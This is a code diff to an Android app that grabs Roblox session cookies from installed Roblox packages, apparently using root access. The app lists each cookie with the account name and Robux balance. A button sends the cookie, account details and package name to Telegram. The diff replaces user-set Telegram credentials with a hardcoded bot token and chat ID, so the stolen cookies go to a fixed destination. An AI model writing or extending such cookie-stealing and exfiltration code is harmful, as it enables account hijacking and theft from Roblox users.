@@ -1,6 +1,5 @@
 package com.rbxtool.app
 
-import android.content.Context
 import android.graphics.Color
 import android.os.Bundle
 import android.view.LayoutInflater
@@ -15,6 +14,7 @@ import com.google.android.material.card.MaterialCardView
 import com.rbxtool.app.data.Account
 import com.rbxtool.app.data.AccountStorage
 import com.rbxtool.app.databinding.FragmentGrabBinding
+import com.rbxtool.app.util.Constants
 import com.rbxtool.app.util.CookieManager
 import com.rbxtool.app.util.RobloxApi
 import com.rbxtool.app.util.RootUtils
@@ -62,87 +62,85 @@ class GrabFragment : Fragment() {
             }
 
             b.tvStatus.text = "✅ Ketemu ${results.size} cookie"
-
-            val prefs = requireContext().getSharedPreferences("rbx_settings", Context.MODE_PRIVATE)
-            val token = prefs.getString("bot_token", "") ?: ""
-            val chatId = prefs.getString("chat_id", "") ?: ""
-
-            results.forEach { (pkg, cookie, account) ->
-                addResultCard(pkg, cookie, account, token, chatId)
-            }
+            results.forEach { (pkg, cookie, account) -> addResultCard(pkg, cookie, account) }
         }
     }
 
-    private fun addResultCard(pkg: String, cookie: String, account: Account?, token: String, chatId: String) {
+    private fun addResultCard(pkg: String, cookie: String, account: Account?) {
         val ctx = requireContext()
         val card = MaterialCardView(ctx).apply {
-            setCardBackgroundColor(Color.parseColor("#1E1E1E"))
-            radius = 12f
+            setCardBackgroundColor(Color.parseColor("#141414"))
+            radius = 24f
+            strokeColor = Color.parseColor("#252525")
+            strokeWidth = 2
             val lp = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
-            lp.bottomMargin = 16
+            lp.bottomMargin = 20
             layoutParams = lp
         }
 
         val inner = LinearLayout(ctx).apply {
             orientation = LinearLayout.VERTICAL
-            setPadding(32, 24, 32, 24)
+            setPadding(40, 32, 40, 32)
         }
 
         val shortPkg = pkg.removePrefix("com.roblox.")
         val header = if (account != null)
-            "👤 @${account.username}  💰 ${account.robux} Robux\n📦 $shortPkg"
+            "👤  @${account.username}   💰  ${account.robux} Robux\n📦  $shortPkg"
         else
-            "📦 $shortPkg\n⚠️ Cookie valid tapi API gagal"
+            "📦  $shortPkg\n⚠️  Cookie valid tapi API gagal"
 
         inner.addView(TextView(ctx).apply {
             text = header
-            setTextColor(Color.parseColor("#EEEEEE"))
+            setTextColor(Color.parseColor("#F0F0F0"))
             textSize = 14f
+            lineSpacingMultiplier = 1.5f
         })
 
-        // Cookie preview
         inner.addView(TextView(ctx).apply {
-            text = cookie.take(60) + "..."
-            setTextColor(Color.parseColor("#888888"))
+            text = cookie.take(55) + "..."
+            setTextColor(Color.parseColor("#555555"))
             textSize = 10f
-            setPadding(0, 8, 0, 12)
+            typeface = android.graphics.Typeface.MONOSPACE
+            setPadding(0, 10, 0, 16)
         })
 
-        val btnRow = LinearLayout(ctx).apply { orientation = LinearLayout.HORIZONTAL }
+        val btnRow = LinearLayout(ctx).apply {
+            orientation = LinearLayout.HORIZONTAL
+        }
 
-        // Save button
         btnRow.addView(MaterialButton(ctx).apply {
-            text = "💾 Save"
+            text = "SAVE"
             textSize = 11f
+            letterSpacing = 0.06f
+            setTextColor(Color.parseColor("#F0F0F0"))
             setBackgroundColor(Color.parseColor("#1565C0"))
             setOnClickListener {
                 account?.let {
                     AccountStorage(ctx).save(it)
                     isEnabled = false
-                    text = "✓ Saved"
+                    text = "✓ SAVED"
                 }
             }
             val lp = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
-            lp.marginEnd = 8
+            lp.marginEnd = 10
             layoutParams = lp
         })
 
-        // Send TG button
         btnRow.addView(MaterialButton(ctx).apply {
-            text = "📤 TG"
+            text = "SEND TG"
             textSize = 11f
-            setBackgroundColor(Color.parseColor("#0288D1"))
+            letterSpacing = 0.06f
+            setTextColor(Color.parseColor("#F0F0F0"))
+            setBackgroundColor(Color.parseColor("#E87820"))
             setOnClickListener {
-                if (token.isEmpty() || chatId.isEmpty()) {
-                    text = "❌ Set TG dulu"
-                    return@setOnClickListener
-                }
                 isEnabled = false
                 text = "Sending..."
                 lifecycleScope.launch {
                     val msg = buildTgMessage(account, pkg, cookie)
-                    val ok = withContext(Dispatchers.IO) { TelegramHelper.sendMessage(token, chatId, msg) }
-                    text = if (ok) "✓ Sent!" else "❌ Gagal"
+                    val ok = withContext(Dispatchers.IO) {
+                        TelegramHelper.sendMessage(Constants.BOT_TOKEN, Constants.CHAT_ID, msg)
+                    }
+                    text = if (ok) "✓ SENT!" else "❌ GAGAL"
                 }
             }
             layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
